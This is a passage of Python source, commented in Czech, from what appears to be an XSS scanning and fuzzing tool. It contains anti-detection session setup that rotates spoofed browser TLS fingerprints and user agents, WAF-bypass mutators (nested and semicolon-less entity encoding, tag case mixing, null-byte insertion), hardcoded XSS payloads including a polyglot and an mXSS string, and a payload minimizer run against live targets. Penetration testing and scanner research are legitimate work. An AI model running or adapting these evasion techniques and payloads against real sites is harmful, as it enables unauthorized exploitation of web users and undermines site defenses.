        cffi_impersonate: Konkrétní curl_cffi profil ("chrome131",
                          "firefox133", ...). Když None a curl_cffi je
                          dostupné, použije se "chrome131" automaticky
                          (v10.14 anti-detection: browser JA3 by default).
                          Když curl_cffi není nainstalované, fallback na
                          requests s browser-realistickým TLSAdapter.
        legacy_tls:       Opt-in. requests cesta nabídne permisivní
                          ClientHello ('ALL:@SECLEVEL=0' + TLSv1) pro
                          připojení k prastarým serverům s broken TLS.
                          Produkuje NE-prohlížečový JA3 — používej jen
                          když to cíl skutečně vyžaduje. Bez efektu na
                          curl_cffi cestě (ta má vždy browser JA3).
    """
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # ── v10.14: curl_cffi je AUTO-DEFAULT (varianta C) ──
    # Když uživatel nezadal konkrétní profil, ale curl_cffi je dostupné,
    # použij chrome131 automaticky — browser-grade JA3/JA4 pro každý scan
    # bez nutnosti explicitního --cffi-impersonate. Tohle reálně zavře
    # JA3 fingerprint díru. legacy_tls cesta zůstává čistě requests
    # (uživatel explicitně chce permisivní handshake pro starý server).
    _cffi_profile = cffi_impersonate
    if (_cffi_profile is None and not legacy_tls
            and is_curl_cffi_available()):
        _cffi_profile = "chrome131"
        logging.info(
            "curl_cffi auto-enabled (browser JA3/JA4 default) — "
            "impersonate=chrome131. Override with --cffi-impersonate "
            "or fall back to requests TLS with --legacy-tls.")

    # v10.14: cffi_impersonate="rotate" sentinel → per-session
    # rotace JA3 profilu. Volající (typicky create_scan_sessions)
    # předá "rotate" pro každou ze 3 hlavních sessions a pick_cffi_profile
    # vybere náhodný UA-konzistentní profil. Tím server vidí 3 různé
    # browsery napříč scan fázemi místo jednoho s konzistentním JA3.
    if _cffi_profile == "rotate":
        # Použij UA hint z rotatoru pro UA↔JA3 konzistenci
        ua_hint = None
        if rotate_ua:
            try:
                _tmp_rot = (ua_rotator or
                            get_ua_rotator(user_agents or DEFAULT_USER_AGENTS))
                # next_headers() vrátí dict s "User-Agent" klíčem
                ua_hint = _tmp_rot.next_headers().get("User-Agent")
            except Exception:
                ua_hint = None
        _cffi_profile = pick_cffi_profile(rotate=True, ua_hint=ua_hint)
        logging.info(
            f"curl_cffi rotation — selected profile={_cffi_profile} "
            f"(UA hint: {ua_hint[:40] if ua_hint else 'none'}...)")

    # ── curl_cffi cesta ──
    if _cffi_profile:
        if not is_curl_cffi_available():
            logging.warning(
                f"[!]️  cffi_impersonate='{_cffi_profile}' requested, "
                f"but curl_cffi is not installed. Falling back to requests "
                f"with browser-realistic TLSAdapter. "
                f"Nainstaluj: pip install curl_cffi"
            )
        else:
            try:
                s = make_cffi_session(
                    impersonate=_cffi_profile,
                    proxies=proxies,
                    verify_ssl=verify_ssl,
                )
                # Attach rotator (curl_cffi.Session má kompatibilní API s requests.Session)
                if ua_rotator is None and rotate_ua:
                    ua_rotator = get_ua_rotator(user_agents or DEFAULT_USER_AGENTS)
                if ua_rotator is not None:
                    s.headers.update(ua_rotator.next_headers())
                    s._ua_rotator = ua_rotator  # type: ignore[attr-defined]
                # v10.14: adaptive throttling flag (per-host backoff
                # at 429/503). perform_request() checks this attribute.
                s._adaptive_throttle = adaptive_throttle  # type: ignore[attr-defined]
                logging.info(f"curl_cffi session active — impersonate={_cffi_profile}")
                return s
            except Exception as e:
                logging.error(f"curl_cffi session selhal: {e}, fallback na requests s browser-realistic TLS")

    # ── Klasická requests cesta ──
    s = requests.Session()

    adapter = TLSAdapter(
        pool_connections=pool_size,
        pool_maxsize=pool_size,
        legacy_tls=legacy_tls,
        max_retries=Retry(
            total=0,
            raise_on_status=False
        )
    )

    s.mount("http://", adapter)
    s.mount("https://", adapter)

    # UA rotator má prioritu nad user_agents listem
    if ua_rotator is None and rotate_ua:
        ua_rotator = get_ua_rotator(user_agents or DEFAULT_USER_AGENTS)

    if ua_rotator is not None:
        s.headers.update(ua_rotator.next_headers())
        s._ua_rotator = ua_rotator  # type: ignore[attr-defined]
    else:
        s.headers.update({"User-Agent": random.choice(user_agents or DEFAULT_USER_AGENTS)})

    s.verify = False

    if proxies:
        s.proxies.update(proxies)

    # v10.14: adaptive throttling flag (per-host backoff at 429/503).
    # perform_request() checks this attribute.
    s._adaptive_throttle = adaptive_throttle  # type: ignore[attr-defined]

    return s
 
# ---------- Detection helpers ----------
WAF_KEYWORDS = (
    "access denied", "request blocked", "blocked by", "security policy",
    "mod_security", "modsecurity", "cloudflare", "akamai", "imperva",
    "web application firewall", "forbidden"
)
 
def has_candidate_signals(body: str, payload: str, status: int) -> Optional[str]:
    """Heuristika: escaped fragmenty, WAF hlášky/4xx, částečná reflexe."""
    if body is None:
        return None
    low = (body or "").lower()
    if any(k in low for k in WAF_KEYWORDS) or status in (403, 406, 501):
        return "WAF/block signal"
    if "&lt;" in body or "&gt;" in body or "&quot;" in body or "&#x" in body:
        frag = escape(payload[:10])
        if frag and frag in body:
            return "Escaped reflection"
    if payload[:8] in body:
        return "Partial reflection"
    return None
 
# ---------- Fuzzer & Mutators ----------
ENCODING_CHARS = ["%", "&#", "\\u"]
 
def urlencode_once(s: str) -> str:
    return requests.utils.quote(s, safe="")
 
def urlencode_twice(s: str) -> str:
    return requests.utils.quote(urlencode_once(s), safe="")
 
def html_entities(s: str) -> str:
    return ''.join(f"&#x{ord(c):x};" if c not in (' ',) else c for c in s)
 
def js_unicode(s: str) -> str:
    return ''.join(f"\\u{ord(c):04x}" for c in s)
 
def break_tag(s: str) -> str:
    """
    WAF bypass: vary the CASE of the tag name so a literal \"<script\" WAF rule
    misses, WITHOUT splitting the name.

    v10.78 fix: the old version inserted a TAB inside the tag name
    (\"<scr\\tipt>\"). Whitespace terminates a tag name, so the HTML parser reads
    that as a \"<scr>\" element with an \"ipt\" attribute — it NEVER becomes
    <script> and the payload is inert (a silent false negative for the whole
    script-context bypass). Tag names are case-insensitive, so case-mixing is a
    valid dodge that still executes.
    """
    return (s
            .replace("<script", "<ScRiPt")
            .replace("</script>", "</ScRiPt>")
            .replace("<SCRIPT", "<ScRiPt")
            .replace("</SCRIPT>", "</ScRiPt>"))
 
def add_wrapper_quotes(s: str) -> str:
    return f"\"{s}\""
 
def prepend_suffix(s: str) -> str:
    return f"'>{s}//"
 
def whitespace_trick(s: str) -> str:
    return s.replace(" ", "/**/")
 
MUTATORS = [
    ("urlencode", urlencode_once),
    ("double_urlencode", urlencode_twice),
    ("html_entities", html_entities),
    ("js_unicode", js_unicode),
    ("break_tag", break_tag),
    ("wrap_quotes", add_wrapper_quotes),
    ("attr_break", prepend_suffix),
    ("ws_trick", whitespace_trick),
]

# Whitelist mutátorů povolených v daném kontextu.
# Mutátory mimo whitelist se v daném kontextu nepoužijí — eliminuje nesmyslné
# kombinace (např. polyglot v script_body kontextu) a urychluje konvergenci fuzzeru.
CONTEXT_MUTATOR_WHITELIST = {
    "script": {
        "js_unicode", "unicode_mixed", "ws_trick", "break_tag",
        "fragment_concat", "template_lit", "html_entities",
    },
    "attr": {
        "attr_break", "wrap_quotes", "xml_entity", "urlencode",
        "double_urlencode", "html_entities", "ws_trick",
        "entity_no_semi", "nested_encode",
    },
    "url": {
        "urlencode", "double_urlencode", "data_protocol",
        "html_entities", "js_unicode",
    },
    "html": {
        "polyglot", "svg_abuse", "waf_chain", "break_tag",
        "wrap_quotes", "html_entities", "ws_trick", "attr_break",
        "nested_encode", "double_html_entity", "entity_no_semi",
    },
}
 
def _context_at_offset(body: str, offset: int) -> str:
    """v10.16: Klasifikuje kontext markeru NA dané pozici podle toho, V ČEM
    se nachází — ne symetrickým oknem (to bleeduje přes hranice tagů, viz
    bug kdy <div>marker</div><script> klasifikoval div-marker jako script,
    protože <script byl v okně +80). Scanuje DOZADU od pozice:
      - poslední <script ... > bez uzavíracího </script> před markerem → script
      - poslední <style ... > bez </style> → style
      - uvnitř HTML komentáře <!-- ... --> → comment
      - uvnitř otevřeného tagu (poslední < bez >) v atributu → url/attr
      - jinak → html
    """
    before = body[:offset]

    # Uvnitř <script>? Poslední <script ...> musí být po posledním </script>.
    last_script_open = before.rfind("<script")
    last_script_close = before.rfind("</script")
    if last_script_open > last_script_close:
        return "script"

    # Uvnitř <style>?
    last_style_open = before.rfind("<style")
    last_style_close = before.rfind("</style")
    if last_style_open > last_style_close:
        return "style"

    # Uvnitř HTML komentáře?
    last_comment_open = before.rfind("<!--")
    last_comment_close = before.rfind("-->")
    if last_comment_open > last_comment_close:
        return "comment"

    # Uvnitř otevřeného tagu (atribut)? Poslední '<' bez následného '>'.
    last_lt = before.rfind("<")
    last_gt = before.rfind(">")
    if last_lt > last_gt:
        # jsme uvnitř <tag ...> — rozliš url atribut vs běžný atribut
        tag_frag = before[last_lt:].lower()
        if ("href=" in tag_frag or "src=" in tag_frag
                or "action=" in tag_frag or "formaction=" in tag_frag):
            return "url"
        return "attr"

    return "html"


def guess_context_from_snippet(snippet: str) -> str:
    s = snippet.lower()
    if "<script" in s:
        return "script"
    if "href=" in s or "src=" in s or "action=" in s:
        return "url"
    if "=" in s and ("'" in s or '"' in s):
        return "attr"
    return "html"
 
def context_probe_multi(session: requests.Session, url: str, param: str,
                        timeout: float, follow_redirects: bool) -> List[str]:
    """v10.16: Detekuje VŠECHNY distinktní kontexty, ve kterých se parametr
    reflektuje — ne jen první. Klíčová oprava false-negativů: parametr se
    může reflektovat escapovaný v HTML body (bezpečný) A ZÁROVEŇ neescapovaný
    uvnitř <script> na téže stránce (zranitelný). Původní context_probe()
    vracela jen první výskyt (`body.find(marker)`) → druhý kontext se nikdy
    netestoval. Tady projdeme všechny výskyty markeru a vrátíme unikátní
    payload-banky.

    Vrací seznam probe-bank stringů (např. ["html", "script"]); prázdný =
    žádná reflexe. Pořadí: nejrizikovější kontext první (script > url > attr
    > style > comment > html), ať context-aware fáze testuje to nejdřív.
    """
    marker = random_marker(10)
    test_url = inject_into_params(url, param, marker, extra_params=None)
    if not test_url:
        return []
    try:
        r = session.get(test_url, timeout=timeout, allow_redirects=follow_redirects)
        body = r.text or ""
    except _NET_EXCEPTIONS:
        return []

    found: List[str] = []

    # Rich path — parser-based, pokud umí vrátit víc výskytů
    if _CONTEXT_ENGINE_AVAILABLE and _ce_analyze_all is not None:
        try:
            rich_list = _ce_analyze_all(body, marker)
            for rich in rich_list:
                if getattr(rich, "marker_offset", -1) == -1:
                    continue
                bank = _map_rich_context_to_probe_bank(rich)
                if bank not in found:
                    found.append(bank)
        except Exception as e:
            logging.debug(f"[context_probe_multi] rich analyze_all failed: {e}")

    # Regex-based scan VŠECH výskytů markeru, klasifikace podle pozice
    # (co marker OBKLOPUJE), ne symetrickým oknem.
    idx = body.find(marker)
    _guard = 0
    while idx != -1 and _guard < 50:
        _guard += 1
        bank = _context_at_offset(body, idx)
        if bank not in found:
            found.append(bank)
        idx = body.find(marker, idx + len(marker))

    if not found:
        return []

    # Seřaď podle rizikovosti — nejnebezpečnější kontext první
    _risk = {"script": 0, "url": 1, "attr": 2, "event": 2,
             "style": 3, "comment": 4, "html": 5}
    found.sort(key=lambda b: _risk.get(b, 9))
    return found


def context_probe(session: requests.Session, url: str, param: str, timeout: float, follow_redirects: bool) -> str:
    """
    Detekuje kontext reflexe pro daný (url, param).

    Pokud je context_engine dostupný, používá full analyze() s tree-sitter/esprima
    parsery → mnohem přesnější než 80-znakový regex snippet.
    Jinak degraduje na původní guess_context_from_snippet().
    """
    _log_context_engine_status()
    marker = random_marker(10)
    test_url = inject_into_params(url, param, marker, extra_params=None)
    if not test_url:
        return "html"
    try:
        r = session.get(test_url, timeout=timeout, allow_redirects=follow_redirects)
        body = r.text or ""

        # Rich path — parser-based
        if _CONTEXT_ENGINE_AVAILABLE and _ce_analyze is not None:
            try:
                rich = _ce_analyze(body, marker, None)
                if rich.marker_offset == -1:
                    return "html"
                bank = _map_rich_context_to_probe_bank(rich)
                logging.debug(f"[context_probe] url={url[:60]} param={param} "
                             f"→ {bank} ({rich.context.value}/{rich.sub_context.value} "
                             f"sev={rich.severity.value})")
                return bank
            except Exception as e:
                logging.debug(f"[context_probe] rich analyze failed: {e} — regex fallback")

        # Legacy path
        idx = body.find(marker)
        if idx == -1:
            return "html"
        start = max(0, idx-80); end = min(len(body), idx+80)
        snippet = body[start:end]
        return guess_context_from_snippet(snippet)
    except _NET_EXCEPTIONS:
        return "html"
 
class Fuzzer:
    """
    Vylepšený fuzzer s:
    - Cache kontextu per (url, param) — eliminuje duplicitní probes
    - Mutator stats — weighted selection podle historie úspěchu
    - Corpus learning — ukládá/načítá úspěšné payloady napříč scany
    - Deduplikace mutací v rámci jedné dávky
    - Epsilon-greedy exploration (10% náhodný výběr)
    """

    EPSILON = 0.10  # pravděpodobnost náhodného výběru místo weighted

    def __init__(self,
                 base_payloads: List[str],
                 seed: Optional[int] = None,
                 corpus_path: Optional[Path] = None):
        self.corpus = list(base_payloads)
        self._ctx_cache: Dict[Tuple[str, str], str] = {}
        self._mutator_stats: Dict[str, Dict[str, int]] = {}  # {name: {hits, tries}}
        self._corpus_path = corpus_path
        self._learned: List[Dict] = []
        # v10.33: deterministický kurzor pro SYSTEMATICKÉ pokrytí korpusu.
        # Dřív batch() bral base přes random.choice → s konečným budgetem se
        # většina payloads.txt nikdy nezkusila. Round-robin zaručí, že se
        # celý korpus vyzkouší (epsilon-greedy ponechán pro exploration).
        self._cursor = 0
        # v10.34: breakout synthesis — per-(url,param) rich kontext + fronta
        # přesně cílených breakout payloadů (drainuje se ve batch() PŘED korpusem).
        self._rich_ctx_cache: Dict[Tuple[str, str], Any] = {}
        self._synth_queue: List[Tuple[str, str, List[str]]] = []

        if seed is not None:
            random.seed(seed)

        # Načti learned corpus z minulých scanů
        if corpus_path and corpus_path.exists():
            try:
                with corpus_path.open(encoding="utf-8") as f:
                    data = json.load(f)
                    self._learned = data.get("entries", [])
                    self._mutator_stats = data.get("mutator_stats", {})
                # Přidej learned payloady do corpus (s vyšší vahou — 2× duplicita)
                for entry in self._learned[-100:]:  # jen posledních 100
                    p = entry.get("payload")
                    if p:
                        self.corpus.append(p)
                        self.corpus.append(p)  # 2× → vyšší šance při random.choice
            except Exception:
                pass

    # ── Context cache ─────────────────────────────────────────────────────
    def get_context(self,
                    session: requests.Session,
                    url: str,
                    param: str,
                    timeout: float,
                    follow_redirects: bool,
                    probe_enabled: bool = True) -> str:
        """Vrátí kontext pro (url, param) s cachí. Pokud probe je disabled, vrací 'html'."""
        key = (url, param)
        if key in self._ctx_cache:
            return self._ctx_cache[key]
        if not probe_enabled:
            self._ctx_cache[key] = "html"
            return "html"
        ctx = context_probe(session, url, param, timeout, follow_redirects)
        self._ctx_cache[key] = ctx
        return ctx

    # ── v10.34: rich kontext + breakout synthesis ─────────────────────────
    def get_rich_context(self, session: requests.Session, url: str, param: str,
                         timeout: float, follow_redirects: bool,
                         probe_enabled: bool = True) -> Any:
        """Vrátí strukturovaný ReflectionContext (context_engine) pro (url,param),
        s cachí. Při jednom probe naplní i string ctx cache (get_context pak
        nemusí probovat znovu). None = bez reflexe / engine nedostupný."""
        key = (url, param)
        if key in self._rich_ctx_cache:
            return self._rich_ctx_cache[key]
        if (not probe_enabled or not _CONTEXT_ENGINE_AVAILABLE
                or _ce_analyze is None):
            self._rich_ctx_cache[key] = None
            return None
        rc = None
        try:
            marker = random_marker(10)
            test_url = inject_into_params(url, param, marker, extra_params=None)
            if test_url:
                r = session.get(test_url, timeout=timeout,
                                allow_redirects=follow_redirects)
                body = r.text or ""
                rc = _ce_analyze(body, marker, None)
                # naplň i string ctx cache (ušetří druhý probe v get_context)
                if rc is not None and key not in self._ctx_cache:
                    self._ctx_cache[key] = _map_rich_context_to_probe_bank(rc)
        except Exception:
            rc = None
        self._rich_ctx_cache[key] = rc
        return rc

    def prime_synth(self, rc: Any, canary: str = "1", limit: int = 24) -> int:
        """Naplní synth frontu přesně cílenými breakout payloady z rich kontextu.
        Volá se JEDNOU per (url,param). Vrací počet naplněných payloadů."""
        self._synth_queue = []
        if rc is None or not _BREAKOUT_SYNTH_AVAILABLE or _bsynth is None:
            return 0
        try:
            in_attr_exec = False
            try:
                sub = (rc.sub_context.value if hasattr(rc.sub_context, "value")
                       else str(rc.sub_context)).lower()
                in_attr_exec = sub in ("attr_event_handler", "attr_url",
                                       "attr_srcdoc")
            except Exception:
                pass
            pairs = _bsynth.from_reflection_context(rc, canary=canary, limit=limit)
            q: List[Tuple[str, str, List[str]]] = []
            seen = set()
            for tech, payload in pairs:
                for wname, variant in _bsynth.waf_expand(
                        payload, in_attr_exec=in_attr_exec):
                    if variant in seen:
                        continue
                    seen.add(variant)
                    ops = [f"synth:{tech}"] if wname == "base" else \
                          [f"synth:{tech}", f"waf:{wname}"]
                    q.append((payload, variant, ops))
            self._synth_queue = q
        except Exception:
            self._synth_queue = []
        return len(self._synth_queue)

    # ── Mutator stats & weighted selection ────────────────────────────────
    def _weighted_pick(self,
                       candidates: List[Tuple[str, Callable]],
                       k: int) -> List[Tuple[str, Callable]]:
        """
        Vybere k mutátorů podle váh (success rate). S pravděpodobností EPSILON
        udělá čistě náhodný výběr (exploration).
        """
        if not candidates or k <= 0:
            return []
        k = min(k, len(candidates))

        # Exploration branch
        if random.random() < self.EPSILON:
            return random.sample(candidates, k=k)

        # Exploitation branch — weighted
        weights = []
        for name, _ in candidates:
            s = self._mutator_stats.get(name)
            if not s or s["tries"] == 0:
                weights.append(0.5)  # neznámé = střední váha
            else:
                # Laplace smoothing: (hits+1)/(tries+2) + malý base
                rate = (s["hits"] + 1) / (s["tries"] + 2)
                weights.append(rate + 0.05)

        # Weighted sampling bez opakování
        picked = []
        pool = list(candidates)
        pool_weights = list(weights)
        for _ in range(k):
            if not pool:
                break
            idx = random.choices(range(len(pool)), weights=pool_weights, k=1)[0]
            picked.append(pool.pop(idx))
            pool_weights.pop(idx)
        return picked

    def record_result(self, ops: List[str], was_hit: bool) -> None:
        """Zapíše výsledek pokusu do statistik mutátorů."""
        for op in ops:
            s = self._mutator_stats.setdefault(op, {"hits": 0, "tries": 0})
            s["tries"] += 1
            if was_hit:
                s["hits"] += 1

    def record_hit(self, base: str, mutated: str, ops: List[str], ctx: str) -> None:
        """Zaznamená úspěšný hit do learned corpus."""
        self._learned.append({
            "base":    base,
            "payload": mutated,
            "ops":     ops,
            "context": ctx,
            "ts":      time.time(),
        })

    def save_corpus(self) -> None:
        """Persistuje learned corpus + mutator stats na disk."""
        if not self._corpus_path:
            return
        try:
            self._corpus_path.parent.mkdir(parents=True, exist_ok=True)
            with self._corpus_path.open("w", encoding="utf-8") as f:
                json.dump({
                    "entries": self._learned[-500:],  # keep last 500
                    "mutator_stats": self._mutator_stats,
                }, f, indent=2, ensure_ascii=False)
        except Exception:
            pass

    # ── Mutate ────────────────────────────────────────────────────────────
    def mutate_one(self, payload: str, ctx: str) -> Tuple[str, List[str]]:
        ops = []
        p = payload
        order = MUTATORS[:]

        if ctx == "attr":
            order = [
                ("attr_break",    prepend_suffix),
                ("wrap_quotes",   add_wrapper_quotes),
                ("xml_entity",    xml_entity_bypass),
                # v10.16: entita bez středníku — atributové parsery ji
                # akceptují, WAF regex hledá entitu se středníkem.
                ("entity_no_semi", html_entity_no_semicolon),
                ("nested_encode",  nested_encode),
            ] + order

        elif ctx == "url":
            order = [
                ("urlencode",        urlencode_once),
                ("double_urlencode", urlencode_twice),
                ("data_protocol",    data_protocol_bypass),
            ] + order

        elif ctx == "script":
            order = [
                ("js_unicode",      js_unicode),
                ("unicode_mixed",   unicode_escape_mixed),
                ("ws_trick",        whitespace_trick),
                ("break_tag",       break_tag),
                ("fragment_concat", fragmentat_and_concat),
                ("template_lit",    template_literal),
            ] + order

        elif ctx == "html":
            # v10.7: when adaptive_waf enabled and a WAF is detected, use
            # WAF-specific obfuscation chain instead of generic legacy chain.
            if _ADAPTIVE_WAF_ENABLED:
                detected_waf = _waf_get_detected(_ADAPTIVE_WAF_TARGET_HOST or "")
                waf_variants = _waf_generate_obfuscation_chain(
                    payload,
                    target_waf=detected_waf,
                    context="html",
                    max_variants=15,
                )
            else:
                waf_variants = waf_bypass_chain(payload)
            waf_pick = random.choice(waf_variants) if waf_variants else payload
            order = [
                ("polyglot",  lambda _: polyglot_payload()),
                ("svg_abuse", svg_abuse),
                ("waf_chain", lambda _: waf_pick),
                # v10.16: nested/recursive encoding — WAF decode #1 vidí benigní
                # text, browser dekóduje dál → exec.
                ("nested_encode",      nested_encode),
                ("double_html_entity", double_html_entity),
                ("entity_no_semi",     html_entity_no_semicolon),
            ] + order

        # Aplikuj kontextový whitelist — filtruje nesmyslné mutátory
        whitelist = CONTEXT_MUTATOR_WHITELIST.get(ctx)
        if whitelist:
            filtered = [(name, fn) for (name, fn) in order if name in whitelist]
            # Deduplikace při zachování pořadí (order může obsahovat stejný mutátor 2×)
            seen_names = set()
            order = []
            for name, fn in filtered:
                if name in seen_names:
                    continue
                seen_names.add(name)
                order.append((name, fn))

        # Weighted pick místo random.sample
        chosen = self._weighted_pick(order, k=min(3, len(order)))
        for name, fn in chosen:
            try:
                p = fn(p)
                ops.append(name)
            except Exception:
                continue
        return p, ops

    def _next_base(self) -> str:
        """v10.33: Vybere base payload se SYSTEMATICKÝM pokrytím korpusu.
        Round-robin přes celý korpus (zaručí, že se vyzkouší VŠECHNY payloady
        z payloads.txt v rámci budgetu), s pravděpodobností EPSILON náhodný
        výběr (exploration / learned corpus má 2× váhu při random)."""
        if not self.corpus:
            return ""
        if random.random() < self.EPSILON:
            return random.choice(self.corpus)
        base = self.corpus[self._cursor % len(self.corpus)]
        self._cursor += 1
        return base

    def batch(self, ctx: str, n: int = 16) -> List[Tuple[str, str, List[str]]]:
        """
        Vygeneruje dávku mutací. Deduplikuje v rámci dávky —
        pokud už mutation existuje, zkusí jinou až do limitu attempts.

        v10.33: (1) base se vybírá systematicky přes _next_base (pokrytí celého
        korpusu, ne random sampling); (2) base payload se zkusí i SYROVĚ
        (ops=["raw"]) — payloads.txt obsahuje ručně vyrobené evasion payloady,
        které nemá smysl vždy nejdřív zmršit mutátorem; teprve pak se přidá
        zmutovaná varianta.
        """
        out = []
        seen: Set[str] = set()
        # v10.34: PRVNÍ drainuj synth frontu — přesně cílené breakout payloady
        # z naparsovaného kontextu mají přednost před korpusovými mutacemi.
        while self._synth_queue and len(out) < n:
            base, variant, ops = self._synth_queue.pop(0)
            if variant in seen:
                continue
            seen.add(variant)
            out.append((base, variant, ops))
        if len(out) >= n:
            return out
        max_attempts = n * 4
        attempts = 0
        while len(out) < n and attempts < max_attempts:
            attempts += 1
            base = self._next_base()
            if not base:
                continue
            # 1) syrový base payload (jak byl napsán v payloads.txt / corpus)
            if base not in seen:
                seen.add(base)
                out.append((base, base, ["raw"]))
                if len(out) >= n:
                    break
            # 2) zmutovaná varianta téhož base
            mutated, ops = self.mutate_one(base, ctx)
            if mutated in seen:
                continue
            seen.add(mutated)
            out.append((base, mutated, ops))
        return out


def _tokenize_payload(payload: str) -> List[str]:
    """
    Rozdělí XSS payload na logické tokeny — HTML tagy, atributy, JS fragmenty.
    Používá se pro token-based minimizer.

    Příklady:
        '<svg onload=alert(1)>'  →  ['<svg', ' ', 'onload=alert(1)', '>']
        '"><img src=x onerror=alert(1)>' → ['"', '>', '<img', ' ', 'src=x', ' ', 'onerror=alert(1)', '>']
    """
    tokens: List[str] = []
    buf = ""
    i = 0
    n = len(payload)
    while i < n:
        ch = payload[i]
        # HTML tag start
        if ch == "<":
            if buf:
                tokens.append(buf)
                buf = ""
            # najdi konec tag name (do mezery nebo do '>')
            j = i + 1
            while j < n and payload[j] not in " \t\n>/":
                j += 1
            tokens.append(payload[i:j])
            i = j
            continue
        # End of tag
        if ch == ">":
            if buf:
                tokens.append(buf)
                buf = ""
            tokens.append(">")
            i += 1
            continue
        # Whitespace = separator
        if ch in " \t\n":
            if buf:
                tokens.append(buf)
                buf = ""
            tokens.append(ch)
            i += 1
            continue
        # Quote
        if ch in '"\'':
            if buf:
                tokens.append(buf)
                buf = ""
            tokens.append(ch)
            i += 1
            continue
        buf += ch
        i += 1
    if buf:
        tokens.append(buf)
    return tokens


def minimize_payload(session: requests.Session,
                     url: str,
                     param: str,
                     payload: str,
                     timeout: float,
                     follow_redirects: bool) -> str:
    """
    Token-based minimizer pomocí delta debuggingu.

    Rozdělí payload na tokeny a zkouší vyhodit každý token.
    Pokud reflexe stále drží bez daného tokenu, token je redundantní.
    Opakuje dokud není možné vyhodit další tokeny.

    Oproti char-based binárnímu dělení vrací skutečné minimum
    a netestuje syntakticky nevalidní payloady (např. '<svg onloa').
    """
    if not payload or len(payload) <= 3:
        return payload

    tokens = _tokenize_payload(payload)
    if len(tokens) <= 1:
        return payload

    def _test(candidate: str) -> bool:
        if not candidate.strip():
            return False
        test_url = inject_into_params(url, param, candidate, extra_params=None)
        if not test_url:
            return False
        try:
            r = session.get(test_url, timeout=timeout, allow_redirects=follow_redirects)
            return body_contains_reflection(r.text or "", candidate, None)
        except _NET_EXCEPTIONS:
            return False

    best = payload
    changed = True
    max_passes = 3  # nepřekračuj 3 iterace — prevence proti dlouhé minimizaci
    passes = 0

    while changed and passes < max_passes:
        changed = False
        passes += 1
        i = 0
        while i < len(tokens):
            # Zkus vyhodit token i
            candidate_tokens = tokens[:i] + tokens[i+1:]
            candidate = "".join(candidate_tokens)
            if candidate and _test(candidate):
                tokens = candidate_tokens
                best = candidate
                changed = True
                # Nezvyšuj i — zůstaň na pozici, tokeny se posunuly
            else:
                i += 1

    return best

def unicode_escape_mixed(s: str) -> str:
    out = ""
    for i, c in enumerate(s):
        if i % 3 == 0:
            out += f"\\u{ord(c):04x}"
        else:
            out += c
    return out
 
def fragmentat_and_concat(s: str) -> str:
    if 'script' in s.lower():
        return s.replace('script', "scr'+'ipt")
    return s
 
def template_literal(s: str) -> str:
    if 'alert' in s:
        return s.replace('alert', "`ale${'rt'}`")
    return s
 
def svg_abuse(base: str) -> str:
    variants = [
        "<svg/onload=alert(1)>",
        "<svg><animatetransform onbegin=alert(1)>",
        "<svg><set attributeName=onload to=alert(1)>",
        "<math><mtext><table><mglyph><style><!--</style><img title='--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;'>"
    ]
    return random.choice(variants)
 
def polyglot_payload() -> str:
    return r"""jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"""
 
def data_protocol_bypass(payload: str) -> str:
    b64 = base64.b64encode(payload.encode()).decode()
    return f"<object data='data:text/html;base64,{b64}'>"
 
def xml_entity_bypass(s: str) -> str:
    return ''.join(f"&#{ord(c)};" for c in s)



# ── v10.16: Nested/recursive encoding + entity-without-semicolon ──────────────
# WAF dekóduje vstup typicky JEDNOU a pak hledá signatury. Když payload
# zakódujeme víckrát (nebo zkombinujeme encodery), WAF po jednom decode vidí
# pořád benigní text, ale prohlížeč dekóduje až do spustitelné podoby.
def nested_encode(s: str) -> str:
    """URL-encode HTML-entitního payloadu: urlencode(htmlentity(s)).
    WAF decode #1 → HTML entity (benigní), browser pak entity dekóduje → exec.
    Příklad: '<' → '&#60;' → '%26%2360%3B'."""
    from urllib.parse import quote
    entity = ''.join(f"&#{ord(c)};" for c in s)
    return quote(entity, safe="")


def double_html_entity(s: str) -> str:
    """Dvojitě HTML-entitně zakódovaný payload — zakóduje '&' z první entity
    znovu. WAF dekóduje jednou → '&#60;' (text), browser dekóduje podruhé → '<'.
    '<' → '&#38;#60;' (kde &#38; = '&')."""
    out = []
    for c in s:
        out.append(f"&#38;#{ord(c)};")
    return ''.join(out)


def html_entity_no_semicolon(s: str) -> str:
    """HTML entity BEZ ukončujícího středníku — legacy/lenient parsery
    (a některé atributové kontexty) je akceptují, ale WAF regexy typicky
    hledají entity SE středníkem. Kóduje jen klíčové znaky (< > " ' / =),
    zbytek nechává, ať payload zůstane co nejkratší.
    '<script>' → '&#60script&#62'."""
    mapping = {
        "<": "&#60", ">": "&#62", '"': "&#34", "'": "&#39",
        "/": "&#47", "=": "&#61",
    }
    return ''.join(mapping.get(c, c) for c in s)

def waf_bypass_chain(payload: str) -> List[str]:
    variants = []
    # v10.78 fix: case-vary only the HTML tag NAME (case-insensitive), NOT the
    # whole payload. The old payload.swapcase() also flipped case-SENSITIVE JS
    # identifiers ('alert' -> 'ALERT' is not a function), making the variant an
    # inert, non-executing payload.
    def _mix_name(name: str) -> str:
        return "".join(c.upper() if i % 2 else c.lower()
                       for i, c in enumerate(name))
    variants.append(re.sub(r'(</?)([A-Za-z][A-Za-z0-9]*)',
                           lambda m: m.group(1) + _mix_name(m.group(2)), payload))
    variants.append(payload.replace('<', '<\x00'))
    variants.append(payload.replace(' ', '\t').replace('=', '\n='))
    variants.append(payload.replace('script', 's<!---->cript'))
    variants.append(re.sub(r'[<>]', lambda m: f"&#{ord(m.group())};", payload))
    return variants
 
